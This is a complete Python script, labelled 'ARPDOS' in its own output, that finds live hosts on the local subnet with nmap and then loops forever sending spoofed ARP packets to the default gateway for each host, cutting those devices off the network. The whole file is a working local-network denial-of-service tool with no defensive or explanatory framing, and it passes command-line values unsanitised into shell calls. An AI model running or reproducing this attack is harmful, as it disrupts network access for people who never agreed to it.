import os
import time
import sys

if '-add' in sys.argv and '-exclude' in sys.argv:
	print('\nPlease do not use "-add" and "-exclude" in one statement.\n')
	exit()

mode = 'default'

for i in sys.argv:
	if i == '-add':
		mode = 'add'
	elif i == '-exclude':
		mode = 'exclude'

router = os.popen('sudo route | grep "default" | awk \'{print($2)}\'').read().strip('\n')

print('Default gateway: '+router)

if mode == 'exclude':
	targets = []
	indx = sys.argv.index('-exclude')
	for i in range(len(sys.argv)-indx-1):
		targets.append(sys.argv[i+indx+1])
else:
	ifconfig = os.popen('sudo ifconfig wlan0 | grep "broadcast"').read()
	machine = ifconfig.split(' ')[9]
	subnet = ifconfig.split(' ')[12]
	print('\nThis device is '+machine+' under the subnet of '+subnet)
	if subnet == '255.0.0.0':
		cidr = '8'
	elif subnet == '255.255.0.0':
		cidr = '16'
	elif subnet == '255.255.255.0':
		cidr = '24'
	else:
		print('Weird subnet, cannot work with that..')
		exit()
	input('\nPress enter to start [nmap -sn '+router+'/'+cidr+']   ')
	targets = os.popen('sudo nmap -sn '+router+'/'+cidr+' | grep "Nmap scan report for" | awk \'{print($5)}\'').read().split('\n')[:-1]
	for i in range(len(targets)):
		if targets[i] == router:
			targets.pop(i)
			break
	for i in range(len(targets)):
		if targets[i] == machine:
		        targets.pop(i) 
		        break
	if mode == 'add':
		indx = sys.argv.index('-add')
		for i in range(len(sys.argv)-indx-1):
			if sys.argv[i+indx+1] not in targets:
				targets.append(sys.argv[i+indx+1])

if type(targets) is not list:
	print('\nNo targets found, ARPDOS cannot be done.')
	exit()
else:
	print('\nTargets ('+str(len(targets))+'):')
	for i in targets:
		print(i)

delay = 1/float(len(targets))

input('\nPress enter to begin ARP DOS (interval: '+str(delay)+' s)   ')

while True:
	for i in range(len(targets)):
		os.system('arping '+router+' -w 0.1 -S '+targets[i])
		time.sleep(delay)
